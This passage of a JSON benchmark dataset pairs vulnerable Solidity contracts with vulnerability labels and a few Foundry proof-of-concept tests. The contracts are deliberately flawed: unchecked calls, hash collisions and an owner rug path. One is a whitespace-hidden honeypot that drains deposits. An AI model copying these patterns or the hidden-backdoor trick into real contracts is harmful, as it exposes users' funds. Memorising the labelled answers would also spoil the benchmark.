    "id": "smartbugs_unchecked_low_level_calls_0xf2570186500a46986f3139f65afedc2afe4f445d",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0xf2570186500a46986f3139f65afedc2afe4f445d.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 18\n */\n\npragma solidity ^0.4.16;\n\ncontract RealOldFuckMaker {\n    address fuck = 0xc63e7b1DEcE63A77eD7E4Aeef5efb3b05C81438D;\n    \n    // this can make OVER 9,000 OLD FUCKS\n    // (just pass in 129)\n    function makeOldFucks(uint32 number) {\n        uint32 i;\n        for (i = 0; i < number; i++) {\n            // <yes> <report> UNCHECKED_LL_CALLS\n            fuck.call(bytes4(sha3(\"giveBlockReward()\")));\n        }\n    }\n}",
    "vulnerable_function": "makeOldFucks",
    "vulnerable_lines": [
      18
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 1,
    "description": "Unchecked return value - low-level call result not validated at line(s) 18",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0xf2570186500a46986f3139f65afedc2afe4f445d.sol",
    "pragma": "0.4.16",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0xf29ebe930a539a60279ace72c707cba851a57707",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0xf29ebe930a539a60279ace72c707cba851a57707.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 16\n */\n\npragma solidity ^0.4.24;\n\n\ncontract B {\n    address public owner = msg.sender;\n    \n    function go() public payable {\n        address target = 0xC8A60C51967F4022BF9424C337e9c6F0bD220E1C;\n        // <yes> <report> UNCHECKED_LL_CALLS\n        target.call.value(msg.value)();\n        owner.transfer(address(this).balance);\n    }\n    \n    function() public payable {\n    }\n}",
    "vulnerable_function": "go",
    "vulnerable_lines": [
      16
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 1,
    "description": "Unchecked return value - low-level call result not validated at line(s) 16",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0xf29ebe930a539a60279ace72c707cba851a57707.sol",
    "pragma": "0.4.24",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0xf70d589d76eebdd7c12cc5eec99f8f6fa4233b9e",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0xf70d589d76eebdd7c12cc5eec99f8f6fa4233b9e.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 44\n */\n\npragma solidity ^0.4.19;\n\ncontract WhaleGiveaway2\n{\n    address public Owner = msg.sender;\n   \n    function()\n    public\n    payable\n    {\n        \n    }\n   \n    function GetFreebie()\n    public\n    payable\n    {                                                                    \n        if(msg.value>1 ether)\n        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           \n            msg.sender.transfer(this.balance);\n        }                                                                                                                \n    }\n    \n    function withdraw()\n    payable\n    public\n    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  \n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n    \n    function Command(address adr,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        // <yes> <report> UNCHECKED_LL_CALLS\n        adr.call.value(msg.value)(data);\n    }\n}\n",
    "vulnerable_function": "Command",
    "vulnerable_lines": [
      44
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 1,
    "description": "Unchecked return value - low-level call result not validated at line(s) 44",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0xf70d589d76eebdd7c12cc5eec99f8f6fa4233b9e.sol",
    "pragma": "0.4.19",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_etherpot_lotto",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "etherpot_lotto.sol",
    "file_content": "/*\n * @source: https://github.com/etherpot/contract/blob/master/app/contracts/lotto.sol\n * @author: -\n * @vulnerable_at_lines: 109,141\n */\n\n//added pragma version\npragma solidity ^0.4.0;\n\n contract Lotto {\n\n     uint constant public blocksPerRound = 6800;\n     // there are an infinite number of rounds (just like a real lottery that takes place every week). `blocksPerRound` decides how many blocks each round will last. 6800 is around a day.\n\n     uint constant public ticketPrice = 100000000000000000;\n     // the cost of each ticket is .1 ether.\n\n     uint constant public blockReward = 5000000000000000000;\n\n     function getBlocksPerRound() constant returns(uint){ return blocksPerRound; }\n     function getTicketPrice() constant returns(uint){ return ticketPrice; }\n     //accessors for constants\n\n     struct Round {\n         address[] buyers;\n         uint pot;\n         uint ticketsCount;\n         mapping(uint=>bool) isCashed;\n         mapping(address=>uint) ticketsCountByBuyer;\n     }\n     mapping(uint => Round) rounds;\n     //the contract maintains a mapping of rounds. Each round maintains a list of tickets, the total amount of the pot, and whether or not the round was \"cashed\". \"Cashing\" is the act of paying out the pot to the winner.\n\n     function getRoundIndex() constant returns (uint){\n         //The round index tells us which round we're on. For example if we're on block 24, we're on round 2. Division in Solidity automatically rounds down, so we don't need to worry about decimals.\n\n         return block.number/blocksPerRound;\n     }\n\n     function getIsCashed(uint roundIndex,uint subpotIndex) constant returns (bool){\n         //Determine if a given.\n\n         return rounds[roundIndex].isCashed[subpotIndex];\n     }\n\n\n     function calculateWinner(uint roundIndex, uint subpotIndex) constant returns(address){\n         //note this function only calculates the winners. It does not do any state changes and therefore does not include various validitiy checks\n\n         var decisionBlockNumber = getDecisionBlockNumber(roundIndex,subpotIndex);\n\n         if(decisionBlockNumber>block.number)\n             return;\n         //We can't decided the winner if the round isn't over yet\n\n         var decisionBlockHash = getHashOfBlock(decisionBlockNumber);\n         var winningTicketIndex = decisionBlockHash%rounds[roundIndex].ticketsCount;\n         //We perform a modulus of the blockhash to determine the winner\n\n         var ticketIndex = uint256(0);\n\n         for(var buyerIndex = 0; buyerIndex<rounds[roundIndex].buyers.length; buyerIndex++){\n             var buyer = rounds[roundIndex].buyers[buyerIndex];\n             ticketIndex+=rounds[roundIndex].ticketsCountByBuyer[buyer];\n\n             if(ticketIndex>winningTicketIndex){\n                 return buyer;\n             }\n         }\n     }\n\n     function getDecisionBlockNumber(uint roundIndex,uint subpotIndex) constant returns (uint){\n         return ((roundIndex+1)*blocksPerRound)+subpotIndex;\n     }\n\n     function getSubpotsCount(uint roundIndex) constant returns(uint){\n         var subpotsCount = rounds[roundIndex].pot/blockReward;\n\n         if(rounds[roundIndex].pot%blockReward>0)\n             subpotsCount++;\n\n         return subpotsCount;\n     }\n\n     function getSubpot(uint roundIndex) constant returns(uint){\n         return rounds[roundIndex].pot/getSubpotsCount(roundIndex);\n     }\n\n     function cash(uint roundIndex, uint subpotIndex){\n\n         var subpotsCount = getSubpotsCount(roundIndex);\n\n         if(subpotIndex>=subpotsCount)\n             return;\n\n         var decisionBlockNumber = getDecisionBlockNumber(roundIndex,subpotIndex);\n\n         if(decisionBlockNumber>block.number)\n             return;\n\n         if(rounds[roundIndex].isCashed[subpotIndex])\n             return;\n         //Subpots can only be cashed once. This is to prevent double payouts\n\n         var winner = calculateWinner(roundIndex,subpotIndex);\n         var subpot = getSubpot(roundIndex);\n\n         // <yes> <report> UNCHECKED_LL_CALLS\n         winner.send(subpot);\n\n         rounds[roundIndex].isCashed[subpotIndex] = true;\n         //Mark the round as cashed\n     }\n\n     function getHashOfBlock(uint blockIndex) constant returns(uint){\n         return uint(block.blockhash(blockIndex));\n     }\n\n     function getBuyers(uint roundIndex,address buyer) constant returns (address[]){\n         return rounds[roundIndex].buyers;\n     }\n\n     function getTicketsCountByBuyer(uint roundIndex,address buyer) constant returns (uint){\n         return rounds[roundIndex].ticketsCountByBuyer[buyer];\n     }\n\n     function getPot(uint roundIndex) constant returns(uint){\n         return rounds[roundIndex].pot;\n     }\n\n     function() {\n         //this is the function that gets called when people send money to the contract.\n\n         var roundIndex = getRoundIndex();\n         var value = msg.value-(msg.value%ticketPrice);\n\n         if(value==0) return;\n\n         if(value<msg.value){\n             // <yes> <report> UNCHECKED_LL_CALLS\n             msg.sender.send(msg.value-value);\n         }\n         //no partial tickets, send a partial refund\n\n         var ticketsCount = value/ticketPrice;\n         rounds[roundIndex].ticketsCount+=ticketsCount;\n\n         if(rounds[roundIndex].ticketsCountByBuyer[msg.sender]==0){\n             var buyersLength = rounds[roundIndex].buyers.length++;\n             rounds[roundIndex].buyers[buyersLength] = msg.sender;\n         }\n\n         rounds[roundIndex].ticketsCountByBuyer[msg.sender]+=ticketsCount;\n         rounds[roundIndex].ticketsCount+=ticketsCount;\n         //keep track of the total tickets\n\n         rounds[roundIndex].pot+=value;\n         //keep track of the total pot\n\n     }\n\n }\n",
    "vulnerable_function": "cash",
    "vulnerable_lines": [
      109
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 2,
    "description": "Unchecked return value - low-level call result not validated at line(s) 109",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/etherpot_lotto.sol",
    "pragma": "0.4.0",
    "source_url": "https://github.com/etherpot/contract/blob/master/app/contracts/lotto.sol"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_king_of_the_ether_throne",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "king_of_the_ether_throne.sol",
    "file_content": "/*\n * @source: https://github.com/kieranelby/KingOfTheEtherThrone/blob/v0.4.0/contracts/KingOfTheEtherThrone.sol\n * @author: -\n * @vulnerable_at_lines: 110,118,132,174\n */\n\n// A chain-game contract that maintains a 'throne' which agents may pay to rule.\n// See www.kingoftheether.com & https://github.com/kieranelby/KingOfTheEtherThrone .\n// (c) Kieran Elby 2016. All rights reserved.\n// v0.4.0.\n// Inspired by ethereumpyramid.com and the (now-gone?) \"magnificent bitcoin gem\".\n\n// This contract lives on the blockchain at 0xb336a86e2feb1e87a328fcb7dd4d04de3df254d0\n// and was compiled (using optimization) with:\n// Solidity version: 0.2.1-fad2d4df/.-Emscripten/clang/int linked to libethereum\n\n// For future versions it would be nice to ...\n// TODO - enforce time-limit on reign (can contracts do that without external action)?\n// TODO - add a random reset?\n// TODO - add bitcoin bridge so agents can pay in bitcoin?\n// TODO - maybe allow different return payment address?\n\n//added pragma version\npragma solidity ^0.4.0;\n\ncontract KingOfTheEtherThrone {\n\n    struct Monarch {\n        // Address to which their compensation will be sent.\n        address etherAddress;\n        // A name by which they wish to be known.\n        // NB: Unfortunately \"string\" seems to expose some bugs in web3.\n        string name;\n        // How much did they pay to become monarch?\n        uint claimPrice;\n        // When did their rule start (based on block.timestamp)?\n        uint coronationTimestamp;\n    }\n\n    // The wizard is the hidden power behind the throne; they\n    // occupy the throne during gaps in succession and collect fees.\n    address wizardAddress;\n\n    // Used to ensure only the wizard can do some things.\n    modifier onlywizard { if (msg.sender == wizardAddress) _; }\n\n    // How much must the first monarch pay?\n    uint constant startingClaimPrice = 100 finney;\n\n    // The next claimPrice is calculated from the previous claimFee\n    // by multiplying by claimFeeAdjustNum and dividing by claimFeeAdjustDen -\n    // for example, num=3 and den=2 would cause a 50% increase.\n    uint constant claimPriceAdjustNum = 3;\n    uint constant claimPriceAdjustDen = 2;\n\n    // How much of each claimFee goes to the wizard (expressed as a fraction)?\n    // e.g. num=1 and den=100 would deduct 1% for the wizard, leaving 99% as\n    // the compensation fee for the usurped monarch.\n    uint constant wizardCommissionFractionNum = 1;\n    uint constant wizardCommissionFractionDen = 100;\n\n    // How much must an agent pay now to become the monarch?\n    uint public currentClaimPrice;\n\n    // The King (or Queen) of the Ether.\n    Monarch public currentMonarch;\n\n    // Earliest-first list of previous throne holders.\n    Monarch[] public pastMonarchs;\n\n    // Create a new throne, with the creator as wizard and first ruler.\n    // Sets up some hopefully sensible defaults.\n    function KingOfTheEtherThrone() {\n        wizardAddress = msg.sender;\n        currentClaimPrice = startingClaimPrice;\n        currentMonarch = Monarch(\n            wizardAddress,\n            \"[Vacant]\",\n            0,\n            block.timestamp\n        );\n    }\n\n    function numberOfMonarchs() constant returns (uint n) {\n        return pastMonarchs.length;\n    }\n\n    // Fired when the throne is claimed.\n    // In theory can be used to help build a front-end.\n    event ThroneClaimed(\n        address usurperEtherAddress,\n        string usurperName,\n        uint newClaimPrice\n    );\n\n    // Fallback function - simple transactions trigger this.\n    // Assume the message data is their desired name.\n    function() {\n        claimThrone(string(msg.data));\n    }\n\n    // Claim the throne for the given name by paying the currentClaimFee.\n    function claimThrone(string name) {\n\n        uint valuePaid = msg.value;\n\n        // If they paid too little, reject claim and refund their money.\n        if (valuePaid < currentClaimPrice) {\n            // <yes> <report> UNCHECKED_LL_CALLS\n            msg.sender.send(valuePaid);\n            return;\n        }\n\n        // If they paid too much, continue with claim but refund the excess.\n        if (valuePaid > currentClaimPrice) {\n            uint excessPaid = valuePaid - currentClaimPrice;\n            // <yes> <report> UNCHECKED_LL_CALLS\n            msg.sender.send(excessPaid);\n            valuePaid = valuePaid - excessPaid;\n        }\n\n        // The claim price payment goes to the current monarch as compensation\n        // (with a commission held back for the wizard). We let the wizard's\n        // payments accumulate to avoid wasting gas sending small fees.\n\n        uint wizardCommission = (valuePaid * wizardCommissionFractionNum) / wizardCommissionFractionDen;\n\n        uint compensation = valuePaid - wizardCommission;\n\n        if (currentMonarch.etherAddress != wizardAddress) {\n            // <yes> <report> UNCHECKED_LL_CALLS\n            currentMonarch.etherAddress.send(compensation);\n        } else {\n            // When the throne is vacant, the fee accumulates for the wizard.\n        }\n\n        // Usurp the current monarch, replacing them with the new one.\n        pastMonarchs.push(currentMonarch);\n        currentMonarch = Monarch(\n            msg.sender,\n            name,\n            valuePaid,\n            block.timestamp\n        );\n\n        // Increase the claim fee for next time.\n        // Stop number of trailing decimals getting silly - we round it a bit.\n        uint rawNewClaimPrice = currentClaimPrice * claimPriceAdjustNum / claimPriceAdjustDen;\n        if (rawNewClaimPrice < 10 finney) {\n            currentClaimPrice = rawNewClaimPrice;\n        } else if (rawNewClaimPrice < 100 finney) {\n            currentClaimPrice = 100 szabo * (rawNewClaimPrice / 100 szabo);\n        } else if (rawNewClaimPrice < 1 ether) {\n            currentClaimPrice = 1 finney * (rawNewClaimPrice / 1 finney);\n        } else if (rawNewClaimPrice < 10 ether) {\n            currentClaimPrice = 10 finney * (rawNewClaimPrice / 10 finney);\n        } else if (rawNewClaimPrice < 100 ether) {\n            currentClaimPrice = 100 finney * (rawNewClaimPrice / 100 finney);\n        } else if (rawNewClaimPrice < 1000 ether) {\n            currentClaimPrice = 1 ether * (rawNewClaimPrice / 1 ether);\n        } else if (rawNewClaimPrice < 10000 ether) {\n            currentClaimPrice = 10 ether * (rawNewClaimPrice / 10 ether);\n        } else {\n            currentClaimPrice = rawNewClaimPrice;\n        }\n\n        // Hail the new monarch!\n        ThroneClaimed(currentMonarch.etherAddress, currentMonarch.name, currentClaimPrice);\n    }\n\n    // Used only by the wizard to collect his commission.\n    function sweepCommission(uint amount) onlywizard {\n        // <yes> <report> UNCHECKED_LL_CALLS\n        wizardAddress.send(amount);\n    }\n\n    // Used only by the wizard to collect his commission.\n    function transferOwnership(address newOwner) onlywizard {\n        wizardAddress = newOwner;\n    }\n\n}\n",
    "vulnerable_function": "claimThrone",
    "vulnerable_lines": [
      110
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 1,
    "description": "Unchecked return value - low-level call result not validated at line(s) 110",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/king_of_the_ether_throne.sol",
    "pragma": "0.4.0",
    "source_url": "https://github.com/kieranelby/KingOfTheEtherThrone/blob/v0.4.0/contracts/KingOfTheEtherThrone.sol"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_lotto",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "lotto.sol",
    "file_content": "/*\n * @source: https://github.com/sigp/solidity-security-blog\n * @author: Suhabe Bugrara\n * @vulnerable_at_lines: 20,27\n */\n\n pragma solidity ^0.4.18;\n \n contract Lotto {\n\n     bool public payedOut = false;\n     address public winner;\n     uint public winAmount;\n\n     // ... extra functionality here\n\n     function sendToWinner() public {\n         require(!payedOut);\n         // <yes> <report> UNCHECKED_LL_CALLS\n         winner.send(winAmount);\n         payedOut = true;\n     }\n\n     function withdrawLeftOver() public {\n         require(payedOut);\n         // <yes> <report> UNCHECKED_LL_CALLS\n         msg.sender.send(this.balance);\n     }\n }\n",
    "vulnerable_function": "sendToWinner",
    "vulnerable_lines": [
      20
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 1,
    "description": "Unchecked return value - low-level call result not validated at line(s) 20",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/lotto.sol",
    "pragma": "0.4.18",
    "source_url": "https://github.com/sigp/solidity-security-blog"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_mishandled",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "mishandled.sol",
    "file_content": "/*\n * @source: https://github.com/seresistvanandras/EthBench/blob/master/Benchmark/Simple/mishandled.sol \n * @author: -\n * @vulnerable_at_lines: 14\n */\n\npragma solidity ^0.4.0;\ncontract SendBack {\n    mapping (address => uint) userBalances;\n    function withdrawBalance() {  \n\t\tuint amountToWithdraw = userBalances[msg.sender];\n\t\tuserBalances[msg.sender] = 0;\n        // <yes> <report> UNCHECKED_LL_CALLS\n\t\tmsg.sender.send(amountToWithdraw);\n\t}\n}",
    "vulnerable_function": "withdrawBalance",
    "vulnerable_lines": [
      14
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 1,
    "description": "Unchecked return value - low-level call result not validated at line(s) 14",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/mishandled.sol",
    "pragma": "0.4.0",
    "source_url": "https://github.com/seresistvanandras/EthBench/blob/master/Benchmark/Simple/mishandled.sol"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_unchecked_return_value",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "unchecked_return_value.sol",
    "file_content": "/*\n * @source: https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-104#unchecked-return-valuesol\n * @author: -\n * @vulnerable_at_lines: 17\n */\n\npragma solidity 0.4.25;\n\ncontract ReturnValue {\n\n  function callchecked(address callee) public {\n    require(callee.call());\n  }\n\n  function callnotchecked(address callee) public {\n     // <yes> <report> UNCHECKED_LL_CALLS\n    callee.call();\n  }\n}\n",
    "vulnerable_function": "callnotchecked",
    "vulnerable_lines": [
      17
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 1,
    "description": "Unchecked return value - low-level call result not validated at line(s) 17",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/unchecked_return_value.sol",
    "pragma": "0.4.25",
    "source_url": "https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-104#unchecked-return-valuesol"
  },
  {
    "id": "defivulnlabs_hash-collisions",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Hash-collisions.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.15;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: abi.encodePacked() Hash Collisions\n\nDescription:\nUsing abi.encodePacked() with multiple variable length arguments can, \nin certain situations, lead to a hash collision.\n\nHash functions are designed to be unique for each input, \nbut collisions can still occur due to limitations in the hash function's size or the sheer number of possible inputs. \nThis is a known issue mentioned:\nhttps://docs.soliditylang.org/en/v0.8.17/abi-spec.html?highlight=collisions#non-standard-packed-mode\n\nIn deposit function allows users to deposit Ether into the contract based on two string inputs: _string1 and _string2. \nThe contract uses the keccak256 function to generate a unique hash by concatenating these two strings.\n\nIf two different combinations of _string1 and _string2 produce the same hash value, a hash collision will occur. \nThe code does not handle this scenario properly and allows the second depositor to overwrite the previous deposit.\n\nMitigation: \nuse of abi.encode() instead of abi.encodePacked()\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1676476475191750656\nhttps://docs.soliditylang.org/en/v0.8.17/abi-spec.html?highlight=collisions#non-standard-packed-mode\nhttps://swcregistry.io/docs/SWC-133\nhttps://github.com/sherlock-audit/2022-10-nftport-judging/issues/118\n*/\n\ncontract ContractTest is Test {\n    HashCollisionBug HashCollisionBugContract;\n\n    function setUp() public {\n        HashCollisionBugContract = new HashCollisionBug();\n    }\n\n    function testHash_collisions() public {\n        emit log_named_bytes32(\n            \"(AAA,BBB) Hash\",\n            HashCollisionBugContract.createHash(\"AAA\", \"BBB\")\n        );\n        HashCollisionBugContract.deposit{value: 1 ether}(\"AAA\", \"BBB\");\n\n        emit log_named_bytes32(\n            \"(AA,ABBB) Hash\",\n            HashCollisionBugContract.createHash(\"AA\", \"ABBB\")\n        );\n        vm.expectRevert(\"Hash collision detected\");\n        HashCollisionBugContract.deposit{value: 1 ether}(\"AA\", \"ABBB\"); //Hash collision detected\n    }\n\n    receive() external payable {}\n}\n\ncontract HashCollisionBug {\n    mapping(bytes32 => uint256) public balances;\n\n    function createHash(\n        string memory _string1,\n        string memory _string2\n    ) public pure returns (bytes32) {\n        return keccak256(abi.encodePacked(_string1, _string2));\n    }\n\n    function deposit(\n        string memory _string1,\n        string memory _string2\n    ) external payable {\n        require(msg.value > 0, \"Deposit amount must be greater than zero\");\n\n        bytes32 hash = createHash(_string1, _string2);\n        // createHash(AAA, BBB) -> AAABBB\n        // createHash(AA, ABBB) -> AAABBB\n        // Check if the hash already exists in the balances mapping\n        require(balances[hash] == 0, \"Hash collision detected\");\n\n        balances[hash] = msg.value;\n    }\n}\n",
    "vulnerable_contract_only": "contract HashCollisionBug {\n    mapping(bytes32 => uint256) public balances;\n\n    function createHash(\n        string memory _string1,\n        string memory _string2\n    ) public pure returns (bytes32) {\n        return keccak256(abi.encodePacked(_string1, _string2));\n    }\n\n    function deposit(\n        string memory _string1,\n        string memory _string2\n    ) external payable {\n        require(msg.value > 0, \"Deposit amount must be greater than zero\");\n\n        bytes32 hash = createHash(_string1, _string2);\n        // createHash(AAA, BBB) -> AAABBB\n        // createHash(AA, ABBB) -> AAABBB\n        // Check if the hash already exists in the balances mapping\n        require(balances[hash] == 0, \"Hash collision detected\");\n\n        balances[hash] = msg.value;\n    }\n}\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "logic_error",
    "severity": "medium",
    "difficulty_tier": 2,
    "vulnerability_name": "abi.encodePacked() Hash Collisions",
    "description": "Using abi.encodePacked() with multiple variable length arguments can, \nin certain situations, lead to a hash collision.\n\nHash functions are designed to be unique for each input, \nbut collisions can still occur due to limitations in the hash function's size or the sheer number of possible inputs. \nThis is a known issue mentioned:\nhttps://docs.soliditylang.org/en/v0.8.17/abi-spec.html?highlight=collisions#non-standard-packed-mode\n\nIn deposit function allows users to deposit Ether into the contract based on two string inputs: _string1 and _string2. \nThe contract uses the keccak256 function to generate a unique hash by concatenating these two strings.\n\nIf two different combinations of _string1 and _string2 produce the same hash value, a hash collision will occur. \nThe code does not handle this scenario properly and allows the second depositor to overwrite the previous deposit.",
    "scenario": "",
    "fix_description": "use of abi.encode() instead of abi.encodePacked()",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "src/test/Hash-collisions.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_recovererc20",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "recoverERC20.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\n\n/*\nName: Incorrect implementation of the recoverERC20() function in the StakingRewards\n\nDescription:\nThe recoverERC20() function in StakingRewards.sol can potentially serve as a backdoor for the owner to retrieve rewardsToken.\nThere is no corresponding check against the rewardsToken. This creates an administrative privilege where the owner can sweep the rewards tokens, potentially using it as a means to exploit depositors.\nIt's similar to a forked issue if you forked vulnerable code.\n \nMitigation:  \ndisallowing recovery of the rewardToken within the recoverErc20 function\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1680806251482189824\nhttps://github.com/code-423n4/2022-02-concur-findings/issues/210\nhttps://github.com/code-423n4/2022-09-y2k-finance-findings/issues/49\nhttps://github.com/code-423n4/2022-10-paladin-findings/issues/40\nhttps://blog.openzeppelin.com/across-token-and-token-distributor-audit#anyone-can-prevent-stakers-from-getting-their-rewards\n*/\n\ncontract ContractTest is Test {\n    RewardToken RewardTokenContract;\n    VulnStakingRewards VulnStakingRewardsContract;\n    FixedtakingRewards FixedtakingRewardsContract;\n    address alice = vm.addr(1);\n\n    function setUp() public {\n        RewardTokenContract = new RewardToken();\n        VulnStakingRewardsContract = new VulnStakingRewards(\n            address(RewardTokenContract)\n        );\n        RewardTokenContract.transfer(address(alice), 10000 ether);\n        FixedtakingRewardsContract = new FixedtakingRewards(\n            address(RewardTokenContract)\n        );\n        //RewardTokenContract.transfer(address(alice),10000 ether);\n    }\n\n    function testVulnStakingRewards() public {\n        console.log(\n            \"Before rug RewardToken balance in VulnStakingRewardsContract\",\n            RewardTokenContract.balanceOf(address(this))\n        );\n        vm.prank(alice);\n        //If alice transfer reward token to VulnStakingRewardsContract\n        RewardTokenContract.transfer(\n            address(VulnStakingRewardsContract),\n            10000 ether\n        );\n        //admin can rug reward token over recoverERC20()\n        VulnStakingRewardsContract.recoverERC20(\n            address(RewardTokenContract),\n            1000 ether\n        );\n        console.log(\n            \"After rug RewardToken balance in VulnStakingRewardsContract\",\n            RewardTokenContract.balanceOf(address(this))\n        );\n    }\n\n    function testFixedStakingRewards() public {\n        console.log(\n            \"Before rug RewardToken balance in VulnStakingRewardsContract\",\n            RewardTokenContract.balanceOf(address(this))\n        );\n        vm.prank(alice);\n        //If alice transfer reward token to VulnStakingRewardsContract\n        RewardTokenContract.transfer(\n            address(FixedtakingRewardsContract),\n            10000 ether\n        );\n        FixedtakingRewardsContract.recoverERC20(\n            address(RewardTokenContract),\n            1000 ether\n        );\n        console.log(\n            \"After rug RewardToken balance in VulnStakingRewardsContract\",\n            RewardTokenContract.balanceOf(address(this))\n        );\n    }\n\n    receive() external payable {}\n}\n\ncontract VulnStakingRewards {\n    using SafeERC20 for IERC20;\n\n    IERC20 public rewardsToken;\n    address public owner;\n\n    event Recovered(address token, uint256 amount);\n\n    constructor(address _rewardsToken) {\n        rewardsToken = IERC20(_rewardsToken);\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Only owner can call this function\");\n        _;\n    }\n\n    function recoverERC20(\n        address tokenAddress,\n        uint256 tokenAmount\n    ) public onlyOwner {\n        IERC20(tokenAddress).safeTransfer(owner, tokenAmount);\n        emit Recovered(tokenAddress, tokenAmount);\n    }\n}\n\ncontract FixedtakingRewards {\n    using SafeERC20 for IERC20;\n\n    IERC20 public rewardsToken;\n    address public owner;\n\n    event Recovered(address token, uint256 amount);\n\n    constructor(address _rewardsToken) {\n        rewardsToken = IERC20(_rewardsToken);\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Only owner can call this function\");\n        _;\n    }\n\n    function recoverERC20(\n        address 